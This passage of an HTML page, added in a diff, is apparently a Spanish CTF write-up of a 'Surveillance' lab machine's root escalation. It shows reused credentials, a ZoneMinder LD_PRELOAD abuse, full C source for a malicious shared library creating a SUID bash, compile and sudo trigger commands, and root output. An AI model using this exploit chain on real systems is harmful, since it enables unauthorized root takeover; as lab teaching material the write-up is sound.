+User zoneminder may run the following commands on surveillance:
+    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *</code></pre>
+
+                <p>El usuario puede ejecutar cualquier script Perl que coincida con el patrón <code>zm*.pl</code> con privilegios sudo. Los scripts disponibles son:</p>
+                <pre><code class="language-bash">ls -la /bin/zm*</code></pre>
+
+                <pre><code class="language-plaintext">-rwxr-xr-x 1 root root 788096 Nov 23 2022 /bin/zm_rtsp_server
+-rwxr-xr-x 1 root root  43027 Nov 23 2022 /bin/zmaudit.pl
+-rwxr-xr-x 1 root root 731280 Nov 23 2022 /bin/zmc
+-rwxr-xr-x 1 root root  12939 Nov 23 2022 /bin/zmcamtool.pl
+-rwxr-xr-x 1 root root   6043 Nov 23 2022 /bin/zmcontrol.pl
+-rwxr-xr-x 1 root root  26232 Nov 23 2022 /bin/zmdc.pl
+-rwxr-xr-x 1 root root  35206 Nov 23 2022 /bin/zmfilter.pl
+-rwxr-xr-x 1 root root   5640 Nov 23 2022 /bin/zmonvif-probe.pl
+-rwxr-xr-x 1 root root  19386 Nov 23 2022 /bin/zmonvif-trigger.pl
+-rwxr-xr-x 1 root root  13994 Nov 23 2022 /bin/zmpkg.pl
+-rwxr-xr-x 1 root root  17492 Nov 23 2022 /bin/zmrecover.pl
+-rwxr-xr-x 1 root root   4815 Nov 23 2022 /bin/zmstats.pl
+-rwxr-xr-x 1 root root   2133 Nov 23 2022 /bin/zmsystemctl.pl
+-rwxr-xr-x 1 root root  13111 Nov 23 2022 /bin/zmtelemetry.pl
+-rwxr-xr-x 1 root root   5340 Nov 23 2022 /bin/zmtrack.pl
+-rwxr-xr-x 1 root root  18482 Nov 23 2022 /bin/zmtrigger.pl
+-rwxr-xr-x 1 root root 690720 Nov 23 2022 /bin/zmu
+-rwxr-xr-x 1 root root  45421 Nov 23 2022 /bin/zmupdate.pl
+-rwxr-xr-x 1 root root   8205 Nov 23 2022 /bin/zmvideo.pl
+-rwxr-xr-x 1 root root   7022 Nov 23 2022 /bin/zmwatch.pl
+-rwxr-xr-x 1 root root  19655 Nov 23 2022 /bin/zmx10.pl</code></pre>
+
+                <h3>Credenciales de Base de Datos de ZoneMinder</h3>
+                <p>En <code>/etc/zm/zm.conf</code>, encuentro credenciales de base de datos para ZoneMinder:</p>
+                <pre><code class="language-bash"># ZoneMinder database user
+ZM_DB_USER=zmuser
+
+# ZoneMinder database password
+ZM_DB_PASS=ZoneMinderPassword2023</code></pre>
+
+                <p>Conectándome a MySQL, encuentro el hash de contraseña del usuario admin:</p>
+                <pre><code class="language-plaintext">$2y$10$BuFy0QTupRjSWW6kEAlBCO6AlZ8ZPGDI8Xba5pi/gLr2ap86dxYd.</code></pre>
+
+                <p>Aunque este hash no crackea, pruebo la contraseña de Matthew (<code>starcraft122490</code>) con el nombre de usuario <code>admin</code> e inicio sesión exitosamente en la interfaz web de ZoneMinder.</p>
+
+                <h3>Explotando Configuración de LD_PRELOAD</h3>
+                <p>Dentro del panel de configuración de ZoneMinder (accesible mediante la interfaz web), descubro un ajuste que permite especificar una ruta personalizada de <code>LD_PRELOAD</code>. Según la <a href="https://zoneminder.readthedocs.io/en/latest/userguide/options/options_config.html">documentación oficial</a>, este ajuste está destinado a la precarga legítima de librerías:</p>
+
+                <p><img src="./media/image6.png" alt="Panel de configuración de ZoneMinder mostrando el ajuste de ruta LD_PRELOAD" /></p>
+
+                <p>Esto es explotable porque cuando los scripts Perl de ZoneMinder se ejecutan con sudo, respetan el valor de <code>LD_PRELOAD</code> desde la configuración de la aplicación. Puedo abusar de esto:</p>
+
+                <ol>
+                    <li>Creando una librería compartida maliciosa (archivo <code>.so</code>)</li>
+                    <li>Subiéndola al objetivo</li>
+                    <li>Configurando la ruta <code>LD_PRELOAD</code> en la configuración de ZoneMinder para apuntar a esta librería</li>
+                    <li>Ejecutando un script Perl de ZoneMinder con sudo, que cargará nuestra librería maliciosa como root</li>
+                </ol>
+
+                <h3>Creando la Librería Maliciosa</h3>
+                <p>Creo un programa simple en C que será compilado como librería compartida:</p>
+                <pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("cp /bin/bash /tmp/xd");
+    system("chown root:root /tmp/xd");
+    system("chmod 6777 /tmp/xd");
+}</code></pre>
+
+                <p>La función <code>_init()</code> se llama automáticamente cuando se carga la librería compartida. Esta:</p>
+                <ul>
+                    <li>Quita <code>LD_PRELOAD</code> para evitar problemas con procesos hijos</li>
+                    <li>Establece el GID y UID efectivos a 0 (root)</li>
+                    <li>Copia <code>/bin/bash</code> a <code>/tmp/xd</code></li>
+                    <li>Establece la propiedad a root</li>
+                    <li>Establece permisos SUID (6777) en el binario bash copiado</li>
+                </ul>
+
+                <p>Compilando esto como librería compartida:</p>
+                <pre><code class="language-bash">gcc -fPIC -shared -o xd.so xd.c -nostartfiles</code></pre>
+
+                <p>Transfiero <code>xd.so</code> a la máquina objetivo en el directorio home del usuario <code>zoneminder</code> y configuro la interfaz web de ZoneMinder para usar esta ruta de librería en el ajuste <code>LD_PRELOAD</code>.</p>
+
+                <h3>Desencadenando la Escalada de Privilegios</h3>
+                <p>Ahora ejecuto uno de los scripts Perl de ZoneMinder con sudo para desencadenar la carga de la librería:</p>
+                <pre><code class="language-bash">sudo /usr/bin/zmdc.pl startup</code></pre>
+
+                <p>Esto crea una copia SUID de bash en <code>/tmp</code>:</p>
+                <pre><code class="language-bash">ls -la /tmp/xd</code></pre>
+
+                <pre><code class="language-plaintext">-rwsrwsrwx 1 root root 1396520 Nov 26 17:02 /tmp/xd</code></pre>
+
+                <p>Usando el binario bash SUID para escalar a root:</p>
+                <pre><code class="language-bash">/tmp/xd -p</code></pre>
+
+                <pre><code class="language-bash">xd-5.1# whoami
+root
+
+xd-5.1# cat /root/root.txt
+d1151402f053854a35db211ba8a542b8</code></pre>
+
+                <p>Ahora tengo acceso root al sistema y puedo recuperar la flag de root, completando la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
